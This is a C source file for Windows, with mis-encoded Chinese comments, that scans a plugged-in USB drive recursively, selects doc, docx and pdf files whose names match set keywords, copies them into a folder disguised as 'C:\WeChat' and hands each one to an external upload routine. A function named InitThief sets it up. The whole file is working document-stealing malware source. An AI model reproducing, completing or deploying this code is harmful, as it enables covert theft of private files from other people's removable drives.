#include "stdafx.h"
#include <string.h>
#include "Shlwapi.h"


#pragma comment(lib, "Shlwapi.lib")

#define MY_DIRECTORY TEXT("C:\\WeChat")
//���Ŀ¼���ڱ����ļ�


//������ void getUDiskLetter()
//���ܣ� ���U���̷�
//������ UDiskPath���ڽ���U���̷�
//����ֵ�� TRUE��ʾ��ȡ�ɹ�
BOOL getUDiskLetter(TCHAR *UDiskPath)
{
	DWORD letters;
	TCHAR drivePath[5] = TEXT("A:\\");
	letters = GetLogicalDrives();
	while(letters != 0)
	{
		if((letters & 1) && (GetDriveType(drivePath) == DRIVE_REMOVABLE))
		{
		//	MessageBox(NULL, drivePath, TEXT("GET IT"), MB_OK);
			lstrcpy(UDiskPath, drivePath);
			return TRUE;
		}
		drivePath[0]++;
		letters >>= 1;
	}
	return FALSE;
}

extern void getFile(TCHAR *fileName);


//������ BOOL CheckFile(TCHAR *path)
//���ܣ� ö��ĳ���̷���Ŀ¼�ṹ���ж��Ƿ��Ǵ���Ŀ���ļ���Ȼ�󱣴�
BOOL CheckFile(TCHAR *path)
{
	WIN32_FIND_DATA dat;
	HANDLE hFind;
	TCHAR sPath[MAX_PATH]; 
	TCHAR sPathwc[MAX_PATH]; //���ڴ�����ɰ���ͨ�����·��
	TCHAR szTemp[MAX_PATH];

	ZeroMemory(sPath, MAX_PATH);
	ZeroMemory(sPathwc, MAX_PATH);

	wsprintf(sPathwc, TEXT("%s%s"), path, TEXT("\\*.*"));
	lstrcpy(sPath, path);

	hFind = FindFirstFile(sPathwc, &dat);
	if (INVALID_HANDLE_VALUE == hFind)
    {
        return FALSE;
    }
	do
	{
		if(dat.cFileName[0] != '.')
		{
			if(FILE_ATTRIBUTE_DIRECTORY & dat.dwFileAttributes)//������ļ���
			{
				wsprintf(sPath, TEXT("%s%s%s"), path, TEXT("\\"), dat.cFileName);
				CheckFile(sPath);//�ݹ�
			}
			else
			{
				//��ͨ�ļ�
				ZeroMemory(szTemp, MAX_PATH);
				wsprintf(szTemp, TEXT("%s%s%s"), path, TEXT("\\"), dat.cFileName);
				getFile(szTemp);
			}
		}
	}while(FindNextFile(hFind, &dat));

	FindClose(hFind);

	return TRUE;
}


//������ void wide2ansi(TCHAR *wide, char *ansi)
//���ܣ� ���ַ�תΪascii�ַ�
//������ wideΪ����Ŀ��ַ�����ansi���ڽ������ɵ�ASCII�ַ���
void wide2ansi(TCHAR *wide, char *ansi)
{
	WideCharToMultiByte(CP_ACP, NULL, wide, sizeof(TCHAR) * lstrlen(wide), ansi, MAX_PATH, NULL, NULL);
	//��СӦ��ע��sizeof(TCHAR) * lstrlen(wide)
}


//������ void isTarget()
//���ܣ� �ж�ĳ���ļ��Ƿ��ǰ����˹ؼ��ֵ�Ŀ���ļ�
//������ fileNameΪ�����˺�׺���ļ���
//����ֵ�� �����ָ�������ļ����򷵻�TRUE
BOOL isTarget(char *fileName)
{
	int i, j;
	char *targetName[6] = {"�ص�", "����", "�Ծ�"};
	char *targetExe[6] = {"doc", "docx", "pdf"};
	for(i = 0; i < 3; i++)
	{
		if(strstr(fileName, targetName[i]) != NULL)
		{
			
			for(j = 0; j < 3; j++)
			{
				if(strstr(fileName, targetExe[j]) != NULL)
				{
					return TRUE;
				}
			}

		}
	}
	return FALSE;
}


extern BOOL UploadViaNewThread(TCHAR *file);

TCHAR *fileToSave[MAX_PATH] = {0}; //�Ƚ�U���ϵ��ļ����浽����Ӳ�̵����λ��
int i = 0;

//���ܣ��������Ҫ���ļ��򱣴�
void getFile(TCHAR *fileName)
{
	char fileNameAnsi[MAX_PATH];
	//TCHAR fileToSave[MAX_PATH] = TEXT("\0"); //�Ƚ�U���ϵ��ļ����浽����

	
	wide2ansi(fileName, fileNameAnsi);
	if(isTarget(fileNameAnsi))//�����Ŀ���ļ�
	{
		//�����ڴ����ڴ�Ÿ��ƺ���ļ���·��
		fileToSave[i] = (TCHAR*)malloc(sizeof(TCHAR) * MAX_PATH);
		ZeroMemory(fileToSave[i], MAX_PATH);

		lstrcat(fileToSave[i], MY_DIRECTORY);
		lstrcat(fileToSave[i], TEXT("\\"));
		lstrcat(fileToSave[i], PathFindFileName(fileName));

		//��ʼ���� 
		CopyFile(fileName, fileToSave[i], FALSE);
		UploadViaNewThread(fileToSave[i]);
		//	Sleep(4000);//�ȴ�һ�£����򴴽��̺߳�ͽ�����һ��ѭ����fileTosave�������仯

		i++;//ʹ����һ���ַ����鱣����һ���ļ�����������һ���ļ����������߳�֮��Ҳ�ᱣ�ֲ���
	}

	
}

//��ʼ��
void InitThief()
{
	//�����ļ������ڱ���
	CreateDirectory(MY_DIRECTORY, NULL);
	while(i-- && i >= 0)//�����ǰ�б����������
	{
		ZeroMemory(fileToSave[i], MAX_PATH);
	}
	i = 0;
}

/*
void test()
{
	InitThief();

	CheckFile(TEXT("D:\\"));

}
*/